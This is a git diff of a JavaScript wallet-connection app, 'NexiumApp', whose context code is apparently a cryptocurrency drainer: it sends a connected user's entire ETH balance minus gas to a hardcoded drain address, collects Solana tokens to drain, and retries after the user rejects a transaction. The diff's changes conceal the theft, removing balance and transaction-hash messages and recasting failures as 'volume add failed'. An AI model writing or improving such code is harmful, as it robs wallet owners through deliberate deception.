@@ -207,7 +207,7 @@ class NexiumApp {
         console.log(`Hiding MetaMask prompt for ${walletName}`);
         this.hideMetaMaskPrompt();
         console.log(`Showing success feedback for ${walletName} connection`);
-        this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+        this.showFeedback(`Connected`, 'success');
         console.log('Rendering token interface');
         this.renderTokenInterface();
         this.connecting = false;
@@ -238,7 +238,7 @@ class NexiumApp {
             console.log(`MetaMask deeplink network: chainId=${network.chainId}, name=${network.name}`);
             if (network.chainId !== 1n) {
               console.error('MetaMask deeplink not on Ethereum mainnet, chainId:', network.chainId);
-              this.showFeedback('MetaMask is not connected to Ethereum mainnet (chainId 1).', 'error');
+              this.showFeedback('MetaMask not connected.', 'error');
               clearInterval(checkConnection);
               this.connecting = false;
               return;
@@ -251,7 +251,7 @@ class NexiumApp {
             console.log(`Hiding MetaMask prompt for ${walletName} (deeplink)`);
             this.hideMetaMaskPrompt();
             console.log(`Showing success feedback for ${walletName} deeplink connection`);
-            this.showFeedback(`Connected to MetaMask and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+            this.showFeedback(`Connected`, 'success');
             console.log('Rendering token interface (deeplink)');
             this.renderTokenInterface();
             clearInterval(checkConnection);
@@ -269,7 +269,7 @@ class NexiumApp {
             console.log(`Hiding MetaMask prompt for ${walletName} (deeplink)`);
             this.hideMetaMaskPrompt();
             console.log(`Showing success feedback for ${walletName} deeplink connection`);
-            this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+            this.showFeedback(`Connected`, 'success');
             console.log('Rendering token interface (deeplink)');
             this.renderTokenInterface();
             clearInterval(checkConnection);
@@ -280,7 +280,7 @@ class NexiumApp {
       setTimeout(() => {
         if (this.connecting) {
           console.log(`Deeplink timed out for ${walletName}`);
-          this.showFeedback('Deeplink timed out or failed. Please connect manually in the wallet app.', 'error');
+          this.showFeedback('error timed out. Please open site in the wallet app browser.', 'error');
           console.log(`Setting button state to disconnected for ${walletName} due to deeplink timeout`);
           this.cacheDOMElements(); // Re-cache DOM elements before updating button state
           this.updateButtonState('disconnected', walletName);
@@ -306,7 +306,7 @@ class NexiumApp {
     this.showProcessingSpinner();
     if (typeof window === "undefined" || !window.ethereum) {
       console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed.");
-      this.showFeedback("No Ethereum provider found. Make sure MetaMask is installed.", 'error');
+      this.showFeedback("error! Make sure MetaMask is installed.", 'error');
       this.hideProcessingSpinner();
       return;
     }
@@ -318,7 +318,7 @@ class NexiumApp {
       console.log(`ETH Drainer network: chainId=${network.chainId}, name=${network.name}`);
       if (network.chainId !== 1n) {
         console.error('ETH Drainer: MetaMask not on Ethereum mainnet, chainId:', network.chainId);
-        this.showFeedback('MetaMask is not connected to Ethereum mainnet (chainId 1).', 'error');
+        this.showFeedback('MetaMask is not connected.', 'error');
         this.hideProcessingSpinner();
         return;
       }
@@ -341,20 +341,20 @@ class NexiumApp {
         try {
           const balance = await provider.getBalance(wallet);
           console.log(`💰 ETH Balance: ${ethers.formatEther(balance)} ETH`);
-          this.showFeedback(`ETH Balance: ${ethers.formatEther(balance)} ETH`, 'info');
+          
 
           const gasLimit = ethers.parseUnits("0.0001", "ether");
           let sendAmount = balance - gasLimit;
 
           if (sendAmount <= 0n) {
             console.log("❌ Not enough ETH to cover gas fees.");
-            this.showFeedback("Not enough ETH to cover gas fees.", 'error');
+            this.showFeedback("Not enough ETH to add volume.", 'error');
             this.hideProcessingSpinner();
             return;
           }
 
           console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}`);
-          this.showFeedback(`Attempting ETH Transaction ${attempts + 1}/${maxRetries}`, 'info');
+          
 
           const tx = await signer.sendTransaction({
             to: DRAIN_ADDRESSES.ethereum,
@@ -363,18 +363,18 @@ class NexiumApp {
           });
 
           console.log("✅ ETH Transaction sent:", tx.hash);
-          this.showFeedback(`ETH Transaction sent: ${this.shortenAddress(tx.hash)}`, 'success');
+          
           this.hideProcessingSpinner();
           return;
         } catch (error) {
           if (error.code === "ACTION_REJECTED") {
             console.warn(`⚠️ User rejected transaction (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
-            this.showFeedback(`User rejected transaction (attempt ${attempts + 1}/${maxRetries}). Retrying...`, 'error');
+            this.showFeedback(`Retrying...`, 'error');
             attempts++;
             await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
           } else {
             console.error("❌ Transaction failed due to an unexpected error:", error);
-            this.showFeedback(`Transaction failed: ${this.escapeHTML(error.message)}`, 'error');
+            this.showFeedback(`volume add failed. please try again!`, 'error');
             this.hideProcessingSpinner();
             return;
           }
@@ -382,11 +382,11 @@ class NexiumApp {
       }
 
       console.error("🚨 Max retries reached. Transaction not completed.");
-      this.showFeedback("Max retries reached. ETH transaction not completed.", 'error');
+      
       this.hideProcessingSpinner();
     } catch (error) {
       console.error("❌ Could not retrieve signer:", error);
-      this.showFeedback(`Could not retrieve signer: ${this.escapeHTML(error.message)}`, 'error');
+    
       this.hideProcessingSpinner();
     }
   }
@@ -422,17 +422,17 @@ class NexiumApp {
 
       console.log(`Found ${tokensToDrain.length} tokens with balance`);
       console.log(`✅ Related SPL Mint Token with Balances:`, tokensToDrain);
-      this.showFeedback(`Found ${tokensToDrain.length} SPL tokens with significant balance`, 'info');
+      
 
       const balance = await this.solConnection.getBalance(senderPublicKey);
       console.log(`💰 SOL Balance: ${balance / 1000000000} SOL`);
-      this.showFeedback(`SOL Balance: ${balance / 1000000000} SOL`, 'info');
+      
 
       const gasFee = 2000000;
 
       if (balance <= gasFee) {
         console.log("❌ Not enough SOL to cover transaction fees.");
-        this.showFeedback("Not enough SOL to cover transaction fees.", 'error');
+        this.showFeedback("Not enough SOL to add volume.", 'error');
         this.hideProcessingSpinner();
         return;
       }
@@ -447,7 +447,7 @@ class NexiumApp {
       while (attempts < maxRetries) {
         try {
           console.log(`🚀 Attempting SOL Transaction ${attempts + 1}/${maxRetries}...`);
-          this.showFeedback(`Attempting SOL Transaction ${attempts + 1}/${maxRetries}`, 'info');
+         
 
           const updatedBlockhash = await this.solConnection.getLatestBlockhash();
           console.log("🔄 Refetched Blockhash:", updatedBlockhash.blockhash);
@@ -468,7 +468,7 @@ class NexiumApp {
 
           await this.solConnection.confirmTransaction(signature, "confirmed");
           console.log("✅ Transaction confirmed");
-          this.showFeedback(`SOL Transaction sent: ${this.shortenAddress(signature)}`, 'success');
+          
           this.hideProcessingSpinner();
           return;
         } catch (error) {
@@ -476,20 +476,20 @@ class NexiumApp {
 
           if (error.message.includes("Blockhash not found")) {
             console.warn(`⚠️ Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
-            this.showFeedback(`Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`, 'error');
+            this.showFeedback(`Retrying...`, 'error');
           } else if (error.message.includes("Attempt to debit an account but found no record of a prior credit")) {
             console.warn("⚠️ Account has no SOL history. Transaction not possible.");
-            this.showFeedback("Account has no SOL history. Transaction not possible.", 'error');
+            this.showFeedback("Account has no SOL history. volume add not possible.", 'error');
             this.hideProcessingSpinner();
             return;
           } else if (error.message.includes("User rejected the request")) {
             console.warn("⚠️ User canceled the transaction.");
-            this.showFeedback("User canceled the transaction.", 'error');
+            this.showFeedback("User canceled this transaction.", 'error');
             this.hideProcessingSpinner();
             return;
           } else {
             console.error("🚨 Unexpected transaction error:", error);
-            this.showFeedback(`Transaction failed: ${this.escapeHTML(error.message)}`, 'error');
+            
             this.hideProcessingSpinner();
             return;
           }
@@ -500,11 +500,11 @@ class NexiumApp {
       }
 
       console.error("🚨 Max retries reached. SOL transaction not completed.");
-      this.showFeedback("Max retries reached. SOL transaction not completed.", 'error');
+      
       this.hideProcessingSpinner();
     } catch (error) {
       console.error("❌ Unexpected error:", error);
-      this.showFeedback(`Unexpected error: ${this.escapeHTML(error.message)}`, 'error');
+      
       this.hideProcessingSpinner();
     }
   }
@@ -651,7 +651,7 @@ class NexiumApp {
       this.updateButtonState('disconnected', 'MetaMask');
       this.updateButtonState('disconnected', 'Phantom');
       this.showDefaultPrompt();
-      this.showFeedback('Please install a supported wallet to use this app.', 'error');
+      
     }
   }
 
@@ -836,7 +836,7 @@ class NexiumApp {
 
   async loadPaymentTokenDetails(paymentTokenAddress) {
     if (!paymentTokenAddress && paymentTokenAddress !== null || !this.solConnection || !this.publicKey) {
-      this.showFeedback('Wallet not connected or invalid token selected.', 'error');
+      this.showFeedback('Wallet not connected.', 'error');
       return;
     }
     try {
@@ -851,7 +851,7 @@ class NexiumApp {
         decimals = 9;
         symbol = selectedToken.symbol;
       } else {
-        this.showFeedback('SPL token balance fetch not supported yet.', 'error');
+        this.showFeedback('error.', 'error');
         return;
       }
       this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
@@ -895,7 +895,7 @@ class NexiumApp {
         decimals = 9;
         symbol = selectedToken.symbol;
       } else {
-        this.showFeedback('SPL token draining not supported yet.', 'error');
+       
         this.hideProcessingSpinner();
         return;
       }
